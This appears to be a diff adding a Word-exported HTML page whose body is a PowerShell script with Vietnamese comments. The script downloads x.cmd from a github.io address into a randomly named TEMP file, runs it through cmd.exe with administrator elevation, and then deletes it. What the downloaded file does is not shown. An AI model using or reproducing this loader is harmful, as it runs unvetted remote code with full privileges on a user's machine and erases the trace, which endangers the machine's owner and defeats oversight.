@@ -1,0 +1,154 @@
+<html>
+
+<head>
+<meta charset="UTF-8">
+<meta http-equiv=Content-Type content="text/html; charset=windows-1252">
+<meta name=Generator content="Microsoft Word 15 (filtered)">
+<style>
+<!--
+ /* Font Definitions */
+ @font-face
+	{font-family:"Cambria Math";
+	panose-1:2 4 5 3 5 4 6 3 2 4;}
+@font-face
+	{font-family:Calibri;
+	panose-1:2 15 5 2 2 2 4 3 2 4;}
+ /* Style Definitions */
+ p.MsoNormal, li.MsoNormal, div.MsoNormal
+	{margin-top:0in;
+	margin-right:0in;
+	margin-bottom:8.0pt;
+	margin-left:0in;
+	line-height:107%;
+	font-size:11.0pt;
+	font-family:"Calibri",sans-serif;}
+.MsoChpDefault
+	{font-family:"Calibri",sans-serif;}
+.MsoPapDefault
+	{margin-bottom:8.0pt;
+	line-height:107%;}
+@page WordSection1
+	{size:8.5in 11.0in;
+	margin:1.0in 1.0in 1.0in 1.0in;}
+div.WordSection1
+	{page:WordSection1;}
+-->
+</style>
+
+</head>
+
+<body lang=EN-US style='word-wrap:break-word'>
+
+<div class=WordSection1>
+
+<p class=MsoNormal align=center style='text-align:center'><b>Code &#273;&#432;&#7907;c
+t&#7893;ng h&#417;p nhi&#7873;u ngu&#7891;n</b></p>
+
+<p class=MsoNormal>try {</p>
+
+<p class=MsoNormal>    # S&#7917; d&#7909;ng TLS 1.2 cho k&#7871;t n&#7889;i
+HTTPS</p>
+
+<p class=MsoNormal>    [Net.ServicePointManager]::SecurityProtocol =
+[Net.SecurityProtocolType]::Tls12</p>
+
+<p class=MsoNormal>} catch {}</p>
+
+<p class=MsoNormal>&nbsp;</p>
+
+<p class=MsoNormal># &#272;&#7863;t URL t&#7843;i file</p>
+
+<p class=MsoNormal>$url = 'https://drhoangzp.github.io/x.cmd'</p>
+
+<p class=MsoNormal>&nbsp;</p>
+
+<p class=MsoNormal># T&#7841;o tên file ng&#7851;u nhiên trong th&#432; m&#7909;c
+TEMP</p>
+
+<p class=MsoNormal>$rand = [guid]::NewGuid().ToString()</p>
+
+<p class=MsoNormal>$tempPath = Join-Path $env:TEMP &quot;x_$rand.cmd&quot;</p>
+
+<p class=MsoNormal>&nbsp;</p>
+
+<p class=MsoNormal># T&#7843;i file</p>
+
+<p class=MsoNormal>try {</p>
+
+<p class=MsoNormal>    Invoke-WebRequest -Uri $url -OutFile $tempPath
+-ErrorAction Stop</p>
+
+<p class=MsoNormal>#    Write-Host &quot;Tai file thanh cong: $tempPath&quot;</p>
+
+<p class=MsoNormal>} catch {</p>
+
+<p class=MsoNormal>    Write-Error &quot;Khong the tai file t&#7915; $url&quot;</p>
+
+<p class=MsoNormal>    return</p>
+
+<p class=MsoNormal>}</p>
+
+<p class=MsoNormal>&nbsp;</p>
+
+<p class=MsoNormal># Ki&#7875;m tra file &#273;ã &#273;&#432;&#7907;c t&#7841;o
+ch&#432;a</p>
+
+<p class=MsoNormal>if (-not (Test-Path $tempPath)) {</p>
+
+<p class=MsoNormal>    Write-Error &quot;File khong ton tai sau khi tai ve.
+Dung lai.&quot;</p>
+
+<p class=MsoNormal>    return</p>
+
+<p class=MsoNormal>}</p>
+
+<p class=MsoNormal>&nbsp;</p>
+
+<p class=MsoNormal># Th&#7921;c thi file v&#7899;i quy&#7873;n admin</p>
+
+<p class=MsoNormal>&nbsp;</p>
+
+<p class=MsoNormal>try {</p>
+
+<p class=MsoNormal># N&#7871;u không mu&#7889;n chuy&#7875;n admin thì thay
+Start-Process -FilePath &quot;cmd.exe&quot; ... thì thay thành &amp; cmd.exe /c
+&quot;`&quot;$tempPath`&quot;&quot;</p>
+
+<p class=MsoNormal>#    &amp; cmd.exe /c &quot;`&quot;$tempPath`&quot;&quot;</p>
+
+<p class=MsoNormal>    Start-Process -FilePath &quot;cmd.exe&quot;
+-ArgumentList &quot;/c `&quot;$tempPath`&quot;&quot; -Verb RunAs -Wait</p>
+
+<p class=MsoNormal>} catch {</p>
+
+<p class=MsoNormal>    Write-Error &quot;Khong the thuc thi file:
+$($_.Exception.Message)&quot;</p>
+
+<p class=MsoNormal>    return</p>
+
+<p class=MsoNormal>}</p>
+
+<p class=MsoNormal>&nbsp;</p>
+
+<p class=MsoNormal># Xoá file sau khi th&#7921;c thi xong</p>
+
+<p class=MsoNormal>try {</p>
+
+<p class=MsoNormal>    Remove-Item $tempPath -Force</p>
+
+<p class=MsoNormal>#    Write-Host &quot;&#272;ã xoá file: $tempPath&quot;</p>
+
+<p class=MsoNormal>} catch {</p>
+
+<p class=MsoNormal>    Write-Warning &quot;Khong the xoa file:
+$($_.Exception.Message)&quot;</p>
+
+<p class=MsoNormal>}</p>
+
+<p class=MsoNormal>&nbsp;</p>
+
+</div>
+
+</body>
+
+</html>
